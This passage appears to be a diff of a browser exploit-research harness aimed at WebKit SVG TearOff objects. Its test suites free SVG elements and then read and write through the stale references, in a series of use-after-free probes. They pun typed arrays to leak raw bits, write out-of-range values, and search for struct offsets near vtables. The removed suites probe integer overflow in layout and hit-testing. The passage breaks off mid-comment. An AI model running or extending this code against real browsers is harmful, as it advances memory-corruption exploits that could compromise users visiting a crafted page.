+  var rect=document.createElementNS(NS,'rect');
+  rect.setAttribute('x','50');rect.setAttribute('y','0');
+  rect.setAttribute('width','100');rect.setAttribute('height','100');
+  // Add SMIL animation
+  var anim=document.createElementNS(NS,'animate');
+  anim.setAttribute('attributeName','x');
+  anim.setAttribute('from','50');anim.setAttribute('to','150');
+  anim.setAttribute('dur','100s');anim.setAttribute('fill','freeze');
+  rect.appendChild(anim);
+  svg1.appendChild(rect);
+
+  // Grab both TearOffs BEFORE free
+  var bvX=rect.x.baseVal;
+  var avX=rect.x.animVal;
+  log('ANM[1]: baseline baseVal.x='+bvX.value+' animVal.x='+avX.value,'info');
+  // During animation at t=0, animVal should read from m_animVal field
+  // while baseVal reads from m_baseVal field
+  var bvBits=null,avBits=null;
+  _f32v[0]=bvX.value;bvBits=_u32v[0];
+  _f32v[0]=avX.value;avBits=_u32v[0];
+  log('ANM[1]: baseVal bits=0x'+bvBits.toString(16)+' animVal bits=0x'+avBits.toString(16),'info');
+
+  // FREE the rect (animation still running?)
+  svg1.removeChild(rect);
+  log('ANM[1]: rect freed (animation was active)','info');
+
+  // Read both after free
+  var bvAfter=null,avAfter=null;
+  try{bvAfter=bvX.value;_f32v[0]=bvAfter;
+    log('ANM[1]: baseVal after free='+bvAfter+' bits=0x'+_u32v[0].toString(16),'star');}
+  catch(e){log('ANM[1]: baseVal err: '+e.message,'fail');}
+  try{avAfter=avX.value;_f32v[0]=avAfter;
+    log('ANM[1]: animVal after free='+avAfter+' bits=0x'+_u32v[0].toString(16),'star');}
+  catch(e){log('ANM[1]: animVal err: '+e.message,'fail');}
+
+  // Are they DIFFERENT? If so, we have two write sites at different offsets
+  var different=(bvAfter!==avAfter);
+  log('ANM[1]: baseVal==animVal='+(bvAfter===avAfter)+
+    (different?' ← DIFFERENT FIELDS = two distinct write sites':'← same field (expected without active anim)'),
+    (different?'crit':'info'));
+
+  // Write to baseVal, then read animVal — do they cross-talk?
+  if(bvAfter!==null){
+    bvX.value=999;
+    var avRb=null;
+    try{avRb=avX.value;}catch(e){}
+    log('ANM[1]: write(bv=999) → animVal reads='+avRb,
+      (avRb===999?'info — same field':avRb!==null?'crit — DIFFERENT FIELD, avRb='+avRb:'fail')
+      ,(avRb!==999&&avRb!==null?'crit':'info'));
   }
+  svg1.remove();
 
-  // SVGFilterElement with PX values
-  var fPX1=document.createElementNS(SVG_NS,'filter');
-  fPX1.setAttribute('id','fPX1');fPX1.setAttribute('x','-50');fPX1.setAttribute('y','-50');
-  fPX1.setAttribute('width','500');fPX1.setAttribute('height','500');
-  fPX1.setAttribute('filterUnits','userSpaceOnUse');
-  testLen('filter.x(px)',     fPX1,function(e){return e.x.baseVal;},     'x');
+  // ANM-2: SVGAnimatedLength.animVal field offset exploration
+  // When NO animation is active: animVal mirrors baseVal (same field)
+  // When animation IS active: animVal reads from m_animatedValue (a separate SVGLength)
+  // So: set up animation, don't start it yet, free element, check if animVal reads different
+  log('ANM[2]: paused animation — does animVal isolate from baseVal?','info');
+  var svg2=makeSVG();
+  var r2=document.createElementNS(NS,'rect');
+  r2.setAttribute('x','11');r2.setAttribute('y','22');
+  r2.setAttribute('width','100');r2.setAttribute('height','100');
+  // Add animation but DON'T start it (begin='indefinite')
+  var anim2=document.createElementNS(NS,'animate');
+  anim2.setAttribute('attributeName','x');
+  anim2.setAttribute('from','11');anim2.setAttribute('to','999');
+  anim2.setAttribute('dur','10s');anim2.setAttribute('begin','indefinite');
+  r2.appendChild(anim2);
+  svg2.appendChild(r2);
 
-  var fPX2=document.createElementNS(SVG_NS,'filter');
-  fPX2.setAttribute('id','fPX2');fPX2.setAttribute('width','500');fPX2.setAttribute('height','500');
-  fPX2.setAttribute('filterUnits','userSpaceOnUse');
-  testLen('filter.width(px)', fPX2,function(e){return e.width.baseVal;}, 'width');
+  var bv2=r2.x.baseVal;
+  var av2=r2.x.animVal;
+  r2.x;  // force TearOff creation
+  log('ANM[2]: before anim start: bv='+bv2.value+' av='+av2.value,'info');
+  // Start animation (begin)
+  anim2.beginElement();
+  log('ANM[2]: anim started, av='+av2.value,'info');
+  // Free immediately after start
+  svg2.removeChild(r2);
+  var bv2a=null,av2a=null;
+  try{bv2a=bv2.value;log('ANM[2]: bv after free='+bv2a,'star');}catch(e){}
+  try{av2a=av2.value;log('ANM[2]: av after free='+av2a,'star');}catch(e){}
+  log('ANM[2]: separate fields='+(bv2a!==av2a),(bv2a!==av2a?'crit':'info'));
+  svg2.remove();
+}
 
-  var fPX3=document.createElementNS(SVG_NS,'filter');
-  fPX3.setAttribute('id','fPX3');fPX3.setAttribute('width','500');fPX3.setAttribute('height','500');
-  fPX3.setAttribute('filterUnits','userSpaceOnUse');
-  testLen('filter.height(px)',fPX3,function(e){return e.height.baseVal;},'height');
+// ─── ASP: SVGPreserveAspectRatio TEAROFF ────────────────────────────────────
+// SVGImageElement.preserveAspectRatio.baseVal returns SVGPreserveAspectRatio TearOff
+// Fields: .align (uint16, 1-10) and .meetOrSlice (uint16, 1-2)
+// This TearOff reads DIFFERENT struct offsets than SVGLength
+// And reads UINT16 values, not float — might expose ptr halves
 
-  // mask with PX values
-  var mPX1=document.createElementNS(SVG_NS,'mask');
-  mPX1.setAttribute('id','mPX1');mPX1.setAttribute('x','0');mPX1.setAttribute('y','0');
-  mPX1.setAttribute('width','400');mPX1.setAttribute('height','400');
-  mPX1.setAttribute('maskUnits','userSpaceOnUse');
-  testLen('mask.x(px)',      mPX1,function(e){return e.x.baseVal;},     'x');
+function runASP(){
+  log('══ ASP: SVGPreserveAspectRatio TEAROFF ══════════','info');
 
-  var mPX2=document.createElementNS(SVG_NS,'mask');
-  mPX2.setAttribute('id','mPX2');mPX2.setAttribute('width','400');mPX2.setAttribute('height','400');
-  mPX2.setAttribute('maskUnits','userSpaceOnUse');
-  testLen('mask.width(px)',  mPX2,function(e){return e.width.baseVal;}, 'width');
+  // ASP-1: Basic TearOff UAF test
+  log('ASP[1]: SVGPreserveAspectRatio TearOff UAF','info');
+  var svg1=makeSVG();
+  var img=document.createElementNS(NS,'image');
+  img.setAttribute('x','0');img.setAttribute('y','0');
+  img.setAttribute('width','100');img.setAttribute('height','100');
+  img.setAttribute('href','data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==');
+  svg1.appendChild(img);
 
-  // feGaussianBlur.stdDeviation — SVGAnimatedNumber? SVGAnimatedNumberList?
-  var fGauss=document.createElementNS(SVG_NS,'filter');
-  fGauss.setAttribute('id','fG1');
-  defs.appendChild(fGauss);
-  var gauss=document.createElementNS(SVG_NS,'feGaussianBlur');
-  gauss.setAttribute('stdDeviation','5');
-  fGauss.appendChild(gauss);
-  L('ADR150: feGaussianBlur.stdDeviation type: '+(gauss.stdDeviation?gauss.stdDeviation.constructor.name:'undefined'),'info');
-  if(gauss.stdDeviation&&gauss.stdDeviation.baseVal!==undefined){
-    var gSD=gauss.stdDeviation;
-    defs.removeChild(fGauss);
-    var t0=performance.now();
-    for(var i=0;i<5000;i++){try{gSD.baseVal=5+i;}catch(e){break;}}
-    var t1=performance.now();
-    L('ADR150: feGaussianBlur.stdDeviation: '+(t1-t0).toFixed(2)+'ms attr='+gauss.getAttribute('stdDeviation'),
-      (t1-t0)>0.1?'hit':'info');
+  var par=img.preserveAspectRatio;
+  var parBase=par.baseVal;
+  log('ASP[1]: baseline align='+parBase.align+' meetOrSlice='+parBase.meetOrSlice,'info');
+
+  svg1.removeChild(img); // FREE
+
+  var alignAfter=null,mosAfter=null;
+  try{alignAfter=parBase.align;log('ASP[1]: align after free='+alignAfter,(alignAfter!==null?'star':'warn'));}
+  catch(e){log('ASP[1]: align err: '+e.message,'fail');}
+  try{mosAfter=parBase.meetOrSlice;log('ASP[1]: meetOrSlice after free='+mosAfter,(mosAfter!==null?'star':'warn'));}
+  catch(e){log('ASP[1]: meetOrSlice err: '+e.message,'fail');}
+
+  // ASP-2: UAF write — can we set align/meetOrSlice to arbitrary values?
+  if(alignAfter!==null){
+    log('ASP[2]: UAF write to align/meetOrSlice','info');
+    try{
+      parBase.align=9;
+      log('ASP[2]: write align=9 readback='+parBase.align,(parBase.align===9?'pass':'warn'));
+    }catch(e){log('ASP[2]: align write err: '+e.message,'fail');}
+    try{
+      parBase.meetOrSlice=2;
+      log('ASP[2]: write meetOrSlice=2 readback='+parBase.meetOrSlice,(parBase.meetOrSlice===2?'pass':'warn'));
+    }catch(e){log('ASP[2]: meetOrSlice write err: '+e.message,'fail');}
+
+    // Can we write OUT OF RANGE values?
+    // Valid align: 1-9 (SVG_PRESERVEASPECTRATIO_XMINYMIN=1 ... SVG_PRESERVEASPECTRATIO_XMAXYMAX=9)
+    // Valid meetOrSlice: 1-2
+    // If WebKit doesn't bounds-check: out-of-range uint16 values can be written
+    log('ASP[2]: OOB write — align=255, meetOrSlice=255','info');
+    try{
+      parBase.align=255;
+      log('ASP[2]: OOB align=255 readback='+parBase.align,(parBase.align===255?'crit':'info'));
+    }catch(e){log('ASP[2]: OOB align err: '+e.message,'warn');}
+    try{
+      parBase.meetOrSlice=255;
+      log('ASP[2]: OOB mos=255 readback='+parBase.meetOrSlice,(parBase.meetOrSlice===255?'crit':'info'));
+    }catch(e){log('ASP[2]: OOB mos err: '+e.message,'warn');}
+    // Negative/large values
+    try{
+      parBase.align=0xFFFF;
+      log('ASP[2]: align=0xFFFF readback='+parBase.align,'star');
+    }catch(e){log('ASP[2]: align=0xFFFF err: '+e.message,'info');}
+    try{
+      parBase.align=0x1234;
+      log('ASP[2]: align=0x1234 readback='+parBase.align,'star');
+    }catch(e){log('ASP[2]: align=0x1234 err: '+e.message,'info');}
+  }
+  svg1.remove();
+
+  // ASP-3: SVGSVGElement.preserveAspectRatio — on root svg element
+  log('ASP[3]: SVGSVGElement.preserveAspectRatio TearOff','info');
+  var svg3=document.createElementNS(NS,'svg');
+  var parentSVG=makeSVG();
+  parentSVG.appendChild(svg3);
+  var par3=svg3.preserveAspectRatio;
+  var base3=par3.baseVal;
+  log('ASP[3]: baseline align='+base3.align+' mos='+base3.meetOrSlice,'info');
+  parentSVG.removeChild(svg3); // FREE
+  var a3=null,m3=null;
+  try{a3=base3.align;log('ASP[3]: align after free='+a3,'star');}catch(e){log('ASP[3]: align err: '+e.message,'fail');}
+  try{m3=base3.meetOrSlice;log('ASP[3]: mos after free='+m3,'star');}catch(e){log('ASP[3]: mos err: '+e.message,'fail');}
+  parentSVG.remove();
+}
+
+// ─── PTH: SVGPathElement TEAROFF ────────────────────────────────────────────
+// SVGPathElement.pathLength.baseVal — returns SVGAnimatedLength (same as rect)
+// BUT: does SVGPathElement's SVGAnimatedLength m_pathLength happen to be at
+// a DIFFERENT struct offset than SVGRectElement's m_x?
+// Goal: probe if SVGPathElement gives a different write offset (closer to vtable)
+//
+// Also: SVGPathElement.pathSegList — returns SVGPathSegList TearOff
+// pathSegList.getItem(0) → SVGPathSeg TearOff with float fields (x,y coordinates)
+// This might read float64 or float32 at yet another struct offset
+
+function runPTH(){
+  log('══ PTH: SVGPathElement TEAROFF PROBE ════════════','info');
+
+  // PTH-1: SVGPathElement.pathLength UAF
+  log('PTH[1]: pathLength TearOff on freed SVGPathElement','info');
+  var svg1=makeSVG();
+  var path=document.createElementNS(NS,'path');
+  path.setAttribute('d','M 10 20 L 30 40');
+  path.setAttribute('pathLength','100');
+  svg1.appendChild(path);
+  var pl=path.pathLength;
+  var plBase=pl.baseVal;
+  log('PTH[1]: pathLength.baseVal='+plBase.value,'info');
+  svg1.removeChild(path); // FREE
+  var plAfter=null;
+  try{plAfter=plBase.value;log('PTH[1]: pathLength after free='+plAfter,(plAfter!==null?'star':'warn'));}
+  catch(e){log('PTH[1]: pathLength err: '+e.message,'fail');}
+  // UAF write
+  if(plAfter!==null){
+    try{
+      plBase.value=9999;
+      log('PTH[1]: UAF write(9999) readback='+plBase.value,'crit');
+      _f32v[0]=plBase.value;
+      log('PTH[1]: write bits=0x'+_u32v[0].toString(16),'star');
+    }catch(e){log('PTH[1]: write err: '+e.message,'fail');}
+  }
+  svg1.remove();
+
+  // PTH-2: SVGPathSeg — path segment TearOff
+  // path.pathSegList.getItem(0) returns SVGPathSegMovetoAbs with .x and .y (float32)
+  // If this gives a UAF, it reads a DIFFERENT struct (SVGPathSegData or similar)
+  log('PTH[2]: SVGPathSeg TearOff UAF probe','info');
+  var svg2=makeSVG();
+  var path2=document.createElementNS(NS,'path');
+  path2.setAttribute('d','M 10 20 L 30 40 Z');
+  svg2.appendChild(path2);
+
+  // Note: pathSegList is deprecated but may still work in WebKit
+  var psl=path2.pathSegList||path2.animatedPathSegList;
+  if(psl&&psl.numberOfItems>0){
+    var seg0=psl.getItem(0);
+    log('PTH[2]: seg[0] type='+seg0.pathSegTypeAsLetter+' x='+seg0.x+' y='+seg0.y,'info');
+    svg2.removeChild(path2); // FREE
+    var sx=null,sy=null;
+    try{sx=seg0.x;log('PTH[2]: seg.x after free='+sx,(sx!==null?'star':'warn'));}
+    catch(e){log('PTH[2]: seg.x err: '+e.message,'fail');}
+    try{sy=seg0.y;log('PTH[2]: seg.y after free='+sy,(sy!==null?'star':'warn'));}
+    catch(e){log('PTH[2]: seg.y err: '+e.message,'fail');}
+    if(sx!==null){
+      try{
+        seg0.x=8888;
+        log('PTH[2]: UAF write seg.x=8888 readback='+seg0.x,'crit');
+      }catch(e){log('PTH[2]: seg.x write err: '+e.message,'fail');}
+    }
   }else{
-    defs.removeChild(fGauss);
+    log('PTH[2]: pathSegList unavailable (deprecated), trying getPathData','warn');
+    // Fallback: getTotalLength gives a float64 result about the path
+    var tl=path2.getTotalLength?path2.getTotalLength():null;
+    log('PTH[2]: getTotalLength='+tl,'info');
+    svg2.removeChild(path2);
   }
+  svg2.remove();
 
-  // feOffset.dx — SVGAnimatedNumber
-  var fOff=document.createElementNS(SVG_NS,'filter');
-  fOff.setAttribute('id','fO1');
-  defs.appendChild(fOff);
-  var feOff=document.createElementNS(SVG_NS,'feOffset');
-  feOff.setAttribute('dx','10');feOff.setAttribute('dy','10');
-  fOff.appendChild(feOff);
-  L('ADR150: feOffset.dx type: '+(feOff.dx?feOff.dx.constructor.name:'undefined'),'info');
-  if(feOff.dx&&typeof feOff.dx.baseVal==='number'){
-    var dxRef=feOff.dx;
-    defs.removeChild(fOff);
-    var t0=performance.now();
-    for(var i=0;i<5000;i++){try{dxRef.baseVal=10+i;}catch(e){break;}}
-    var t1=performance.now();
-    L('ADR150: feOffset.dx: '+(t1-t0).toFixed(2)+'ms attr='+feOff.getAttribute('dx'),
-      (t1-t0)>0.1?'hit':'info');
-  }else{
-    defs.removeChild(fOff);
+  // PTH-3: SVGTextElement coordinate TearOff — reads getStartPositionOfChar
+  // SVGTextContentElement.getStartPositionOfChar(0) returns DOMPoint (float64 x,y)
+  // This is a COMPUTED value, not a TearOff. But let's check if it reads freed state.
+  log('PTH[3]: SVGTextElement getStartPositionOfChar after free','info');
+  var svg3=makeSVG();
+  svg3.setAttribute('width','200');svg3.setAttribute('height','200');
+  svg3.style.cssText='position:absolute;left:-9999px;top:-9999px';
+  var text=document.createElementNS(NS,'text');
+  text.setAttribute('x','10');text.setAttribute('y','20');
+  text.textContent='ABC';
+  svg3.appendChild(text);
+  document.body.appendChild(svg3);
+  var startPos=null;
+  try{startPos=text.getStartPositionOfChar(0);}catch(e){}
+  if(startPos){log('PTH[3]: getStartPositionOfChar(0) x='+startPos.x+' y='+startPos.y,'info');}
+  // Grab x TearOff before free
+  var textXBase=text.x.baseVal;
+  svg3.removeChild(text);
+  var txAfter=null;
+  try{txAfter=textXBase.value;log('PTH[3]: text.x after free='+txAfter,'star');}
+  catch(e){log('PTH[3]: text.x err: '+e.message,'fail');}
+  if(txAfter!==null){
+    try{
+      textXBase.value=12345;
+      log('PTH[3]: text.x UAF write=12345 readback='+textXBase.value,'crit');
+    }catch(e){log('PTH[3]: text.x write err: '+e.message,'fail');}
   }
+  svg3.remove();
 
-  svg.remove();
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR151 — pattern tile corruption via TearOff
-//
-// pattern.width/height are ALIVE (v81).
-// If pattern.width = 1e10, the tile is theoretically 1e10 user units wide.
-// For a rect with fill="url(#p)", the pattern would be drawn starting
-// at (0,0) with a 1e10-unit-wide tile → effectively the whole rect
-// shows only the part of the pattern that overlaps the rect's bounds.
-//
-// More interesting: pattern.width = 0 or -1 → what happens?
-//   width=0: pattern tile is 0 wide → division by zero? crash?
-//   width=-1: negative tile width → infinite loop? undefined behavior?
-//
-// Also: pattern.width=1 (tiny tile) → pattern renders with 1px tiles
-// (heavy GPU load). Then immediately write pattern.width=1e10 →
-// does the rendering engine use the old allocation size with new geometry?
-// ═══════════════════════════════════════════════════════════════
-suites['ADR151']=function(){
-  L('ADR151: pattern tile corruption via TearOff write','info');
-  var svg=document.createElementNS(SVG_NS,'svg');
-  svg.setAttribute('width','300');svg.setAttribute('height','300');
-  document.body.appendChild(svg);
-  var defs=document.createElementNS(SVG_NS,'defs');
-  svg.appendChild(defs);
-
-  var pat=document.createElementNS(SVG_NS,'pattern');
-  pat.setAttribute('id','testPat');pat.setAttribute('x','0');pat.setAttribute('y','0');
-  pat.setAttribute('width','20');pat.setAttribute('height','20');
-  pat.setAttribute('patternUnits','userSpaceOnUse');
-  defs.appendChild(pat);
-
-  var patRect=document.createElementNS(SVG_NS,'rect');
-  patRect.setAttribute('x','0');patRect.setAttribute('y','0');
-  patRect.setAttribute('width','20');patRect.setAttribute('height','10');
-  patRect.setAttribute('fill','#00ff88');
-  pat.appendChild(patRect);
-
-  // Target rect filled with pattern
-  var target=document.createElementNS(SVG_NS,'rect');
-  target.setAttribute('x','0');target.setAttribute('y','0');
-  target.setAttribute('width','300');target.setAttribute('height','300');
-  target.setAttribute('fill','url(#testPat)');
-  svg.appendChild(target);
-
-  var PW=pat.width.baseVal;
-  var PH=pat.height.baseVal;
-
-  L('ADR151: initial pattern size: '+PW.value+'x'+PH.value,'info');
-
-  // Remove pattern from defs, hold TearOff
-  defs.removeChild(pat);
-  L('ADR151: pattern removed from defs — writing via TearOff','info');
-
-  // Write extreme values
-  PW.value=1e10;PH.value=1e10;
-  L('ADR151: wrote pattern.width=1e10 height=1e10','info');
-  L('ADR151: getAttribute(width)='+pat.getAttribute('width'),'info');
-
-  // Write zero
-  PW.value=0;PH.value=0;
-  L('ADR151: wrote pattern.width=0 height=0','info');
-  L('ADR151: getAttribute after zero: w='+pat.getAttribute('width'),'info');
-
-  // Write negative
-  try{
-    PW.value=-1;PH.value=-1;
-    L('ADR151: wrote pattern.width=-1 height=-1','info');
-    L('ADR151: getAttribute after negative: w='+pat.getAttribute('width'),'info');
-  }catch(e){L('ADR151: negative write threw: '+e.message,'warn');}
-
-  // Re-attach pattern to defs and check rendering
-  PW.value=1;PH.value=1;// 1px tiles
-  defs.appendChild(pat);
-  L('ADR151: pattern re-attached with 1x1 tiles','info');
-  L('ADR151: target getBCR: w='+target.getBoundingClientRect().width.toFixed(1),'info');
-
-  // Now write extreme via TearOff while pattern is back in defs
-  PW.value=1e10;
-  L('ADR151: wrote pattern.width=1e10 WHILE IN DEFS','info');
-  L('ADR151: getAttribute after in-defs write: w='+pat.getAttribute('width'),'info');
-
-  // Write to pattern tile inner rect TearOff
-  var PR_W=patRect.width.baseVal;
-  L('ADR151: patRect inner: TearOff alive? writing 9999...','info');
-  PR_W.value=9999;
-  L('ADR151: patRect getAttribute(width)='+patRect.getAttribute('width'),'info');
-
-  svg.remove();
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR152 — setAttribute vs TearOff for fo.width=1e10
-//
-// v81 showed: TearOff fo.width=1e10 → foW=2147483648 (INT32 overflow)
-//
-// Does setAttribute('width','1e10') produce the same overflow?
-// If NOT → the TearOff path does something setAttribute doesn't:
-//   - TearOff writes a raw double into the SVGLength object
-//   - setAttribute parses the string "1e10" → then also sets the SVGLength
-// These should be the same at the C++ SVGLength level.
-//
-// But: TearOff bypasses MutationObserver (confirmed v80).
-// Does setAttribute also bypass the LayoutUnit clamp in foreignObject layout?
-//
-// Also: if setAttribute overflows the same way, then the overflow is in
-// the LAYOUT code (foreignObject box model), not in the TearOff write path.
-// This would mean ANY way of setting fo.width to a large value overflows.
-// ═══════════════════════════════════════════════════════════════
-suites['ADR152']=function(){
-  L('ADR152: setAttribute vs TearOff for fo.width overflow comparison','info');
-  var svg=document.createElementNS(SVG_NS,'svg');
-  svg.setAttribute('width','400');svg.setAttribute('height','400');
-  svg.setAttribute('viewBox','0 0 400 400');
-  document.body.appendChild(svg);
-
-  var fo=document.createElementNS(SVG_NS,'foreignObject');
-  fo.setAttribute('x','0');fo.setAttribute('y','0');
-  fo.setAttribute('width','200');fo.setAttribute('height','200');
-  svg.appendChild(fo);
-  var div=document.createElement('div');
-  div.style.cssText='width:100%;height:100%';
-  fo.appendChild(div);
-
-  // Baseline
-  L('ADR152: baseline foW='+fo.getBoundingClientRect().width.toFixed(1),'info');
-
-  // Test 1: setAttribute with string "10000000000"
-  fo.setAttribute('width','10000000000');
-  var foW_SA=fo.getBoundingClientRect().width;
-  var divW_SA=div.getBoundingClientRect().width;
-  L('ADR152[setAttribute]: foW='+foW_SA+' divW='+divW_SA,'info');
-  if(foW_SA>1e9){L('★★★ ADR152[setAttribute]: ALSO OVERFLOWS via setAttribute!','hit');}
-
-  // Test 2: TearOff
-  fo.setAttribute('width','200');// reset
-  var FOW=fo.width.baseVal;
-  FOW.value=1e10;
-  var foW_TF=fo.getBoundingClientRect().width;
-  var divW_TF=div.getBoundingClientRect().width;
-  L('ADR152[TearOff]: foW='+foW_TF+' divW='+divW_TF,'info');
-
-  // Compare
-  if(foW_SA===foW_TF){
-    L('ADR152: setAttribute and TearOff produce IDENTICAL overflow value','info');
-    L('ADR152: overflow is in LAYOUT CODE (not TearOff-specific)','info');
-  }else{
-    L('★★★ ADR152: DIFFERENT overflow values! setAttribute='+foW_SA+' TearOff='+foW_TF,'hit');
-    L('★★★ ADR152: TearOff-specific code path produces different overflow','hit');
+  // PTH-4: SVGSVGElement coordinate TearOff — nested SVG (x,y are lengths)
+  // SVGSVGElement.x.baseVal — is THIS at a different struct offset?
+  log('PTH[4]: nested SVGSVGElement coordinate TearOff','info');
+  var svg4=makeSVG();
+  var innerSVG=document.createElementNS(NS,'svg');
+  innerSVG.setAttribute('x','55');innerSVG.setAttribute('y','66');
+  innerSVG.setAttribute('width','77');innerSVG.setAttribute('height','88');
+  svg4.appendChild(innerSVG);
+  var isvgX=innerSVG.x.baseVal;
+  var isvgY=innerSVG.y.baseVal;
+  svg4.removeChild(innerSVG); // FREE
+  var ix=null,iy=null;
+  try{ix=isvgX.value;log('PTH[4]: inner svg.x after free='+ix,(ix===55?'star':'warn'));}
+  catch(e){log('PTH[4]: svg.x err: '+e.message,'fail');}
+  try{iy=isvgY.value;log('PTH[4]: inner svg.y after free='+iy,(iy===66?'star':'warn'));}
+  catch(e){log('PTH[4]: svg.y err: '+e.message,'fail');}
+  // UAF write to inner svg
+  if(ix!==null){
+    try{isvgX.value=9876;log('PTH[4]: inner svg UAF write ok, x='+isvgX.value,'crit');}
+    catch(e){log('PTH[4]: inner svg write err: '+e.message,'fail');}
   }
+  svg4.remove();
 
-  // Test 3: try CSS width on the fo's HTML wrapper — not the SVG attribute
-  fo.setAttribute('width','200');
-  fo.style.width='10000000000px';// CSS inline style
-  var foW_CSS=fo.getBoundingClientRect().width;
-  var divW_CSS=div.getBoundingClientRect().width;
-  L('ADR152[CSS style]: foW='+foW_CSS+' divW='+divW_CSS,'info');
-  fo.style.width='';
-
-  // Test 4: fo.width=2^31-1 (just below overflow) vs 2^31 (overflow)
-  var INT32_MAX=2147483647;
-  FOW.value=INT32_MAX;
-  var foW_below=fo.getBoundingClientRect().width;
-  L('ADR152[2^31-1]: foW='+foW_below,'info');
-
-  FOW.value=2147483648;
-  var foW_at=fo.getBoundingClientRect().width;
-  L('ADR152[2^31]: foW='+foW_at,'info');
-  if(foW_below!==foW_at&&foW_at>foW_below){L('ADR152: discrete jump at 2^31','info');}
-  if(foW_at===0||foW_at<0){L('★★★ ADR152: WRAPPED TO ZERO/NEGATIVE at 2^31!','hit');}
-
-  svg.remove();
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR153 — hit-test corruption at 2^31 position
-//
-// v81: fo.x=1e10 → getBCR.x=2147483648 (2^31)
-// This means the layout engine thinks the foreignObject is at x=2^31.
-//
-// If hit-testing uses the same overflowed integer coordinate,
-// then clicking at screen coordinates (0,0) might match the
-// foreignObject (whose layout x coordinate = 2^31 = 0 in int32).
-//
-// Test: place fo at x=1e10 (will overflow to 2^31).
-// Put a button inside. Check if document.elementFromPoint(0, y)
-// returns the foreignObject or its children.
-//
-// Also: elementFromPoint with negative coordinates / huge coordinates.
-// ═══════════════════════════════════════════════════════════════
-suites['ADR153']=function(){
-  L('ADR153: hit-test corruption at INT32 overflow position','info');
-  var svg=document.createElementNS(SVG_NS,'svg');
-  svg.setAttribute('width','400');svg.setAttribute('height','400');
-  svg.setAttribute('viewBox','0 0 400 400');
-  // Position svg at a known location
-  svg.style.cssText='position:fixed;top:0;left:0';
-  document.body.appendChild(svg);
-
-  var fo=document.createElementNS(SVG_NS,'foreignObject');
-  fo.setAttribute('x','0');fo.setAttribute('y','0');
-  fo.setAttribute('width','200');fo.setAttribute('height','200');
-  svg.appendChild(fo);
-
-  var inner=document.createElement('div');
-  inner.id='hitTest153';
-  inner.style.cssText='width:200px;height:200px;background:rgba(255,0,0,0.5);position:relative';
-  inner.textContent='HIT TARGET';
-  fo.appendChild(inner);
-
-  // Baseline: elementFromPoint at (100,100) should find the div
-  var el0=document.elementFromPoint(100,100);
-  L('ADR153: baseline elementFromPoint(100,100)='+
-    (el0?el0.tagName+(el0.id?'#'+el0.id:''):'null'),'info');
-
-  // Now move fo to x=1e10 via TearOff (will overflow to 2^31)
-  var FOX=fo.x.baseVal;
-  FOX.value=1e10;
-  L('ADR153: moved fo.x=1e10 via TearOff','info');
-  L('ADR153: getAttribute(x)='+fo.getAttribute('x'),'info');
-  var foX=fo.getBoundingClientRect().x;
-  L('ADR153: getBCR.x='+foX+' (expected 2147483648?)','info');
-
-  // Check if elementFromPoint at (100,100) still finds the inner div
-  var el1=document.elementFromPoint(100,100);
-  L('ADR153: after overflow, elementFromPoint(100,100)='+
-    (el1?el1.tagName+(el1.id?'#'+el1.id:''):'null'),'info');
-  if(el1&&(el1===inner||el1.id==='hitTest153')){
-    L('★★★ ADR153: HIT TEST FOUND inner div at (100,100) even though fo.x=2^31!','hit');
-    L('★★★ ADR153: hit-test uses OVERFLOWED coordinate → ghost click at (100,100)','hit');
+  // PTH-5: SVGMatrix UAF FIELD COMPARISON
+  // If MTX confirmed float64, compare the float64 matrix.a vs SVGLength float32 x
+  // by writing BOTH on the same freed element and reading back
+  // This lets us confirm they read DIFFERENT offsets in the same freed struct
+  log('PTH[5]: SVGMatrix vs SVGLength — compare offsets on same freed element','info');
+  var svg5=makeSVG();
+  var r5=document.createElementNS(NS,'rect');
+  r5.setAttribute('x','10');r5.setAttribute('y','20');
+  r5.setAttribute('width','30');r5.setAttribute('height','40');
+  r5.setAttribute('transform','matrix(1 0 0 1 50 60)');
+  svg5.appendChild(r5);
+  // Grab ALL TearOffs before free
+  var tfX=r5.x.baseVal;
+  var tfY=r5.y.baseVal;
+  var mxTF=null;
+  try{mxTF=r5.transform.baseVal.getItem(0).matrix;}catch(e){}
+  svg5.removeChild(r5); // FREE both SVGLength AND SVGMatrix TearOffs simultaneously
+  // Read both
+  var xAfter=null,mxA=null,mxE=null;
+  try{xAfter=tfX.value;log('PTH[5]: x.baseVal after free='+xAfter,'star');}catch(e){}
+  try{mxA=mxTF&&mxTF.a;log('PTH[5]: matrix.a after free='+mxA,(mxA!==null?'star':'warn'));}catch(e){log('PTH[5]: matrix.a err: '+(e&&e.message),'fail');}
+  try{mxE=mxTF&&mxTF.e;log('PTH[5]: matrix.e after free='+mxE,(mxE!==null?'star':'warn'));}catch(e){}
+  // Write to both — if they're at different offsets, one write shouldn't corrupt the other
+  if(xAfter!==null&&mxTF){
+    try{tfX.value=111;mxTF.a=2.222;
+      log('PTH[5]: write x=111 and matrix.a=2.222','info');
+      log('PTH[5]: readback x='+tfX.value+' matrix.a='+mxTF.a,
+        (tfX.value===111&&Math.abs(mxTF.a-2.222)<1e-10?'crit':'star'));
+      log('PTH[5]: independent offsets='+(tfX.value===111&&Math.abs(mxTF.a-2.222)<1e-10),
+        (tfX.value===111&&Math.abs(mxTF.a-2.222)<1e-10?'crit':'warn'));
+    }catch(e){log('PTH[5]: write err: '+e.message,'fail');}
   }
-
-  // Try elementFromPoint at INT32 coordinates
-  var el2=document.elementFromPoint(-2147483648,100);
-  L('ADR153: elementFromPoint(-2^31,100)='+
-    (el2?el2.tagName+(el2.id?'#'+el2.id:''):'null'),'info');
-
-  // Try elementFromPoint at 0,0
-  var el3=document.elementFromPoint(0,0);
-  L('ADR153: elementFromPoint(0,0)='+
-    (el3?el3.tagName+(el3.id?'#'+el3.id:''):'null'),'info');
-  if(el3&&el3===inner){L('★★★ ADR153: HIT AT ORIGIN (0,0)! overflow wrap to 0','hit');}
-
-  svg.remove();
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR154 — right-edge wrap: x + width = 2^32 = 0?
-//
-// If fo.x = 2^31 (from TearOff x=1e10) and fo.width = 2^31 (from TearOff width=1e10),
-// then in int32 arithmetic: right = x + width = 2^31 + 2^31 = 2^32 → wraps to 0.
-//
-// This means the right edge of the foreignObject layout box = 0.
-// In WebKit, layout boxes compute: right = x + width. If both x and width
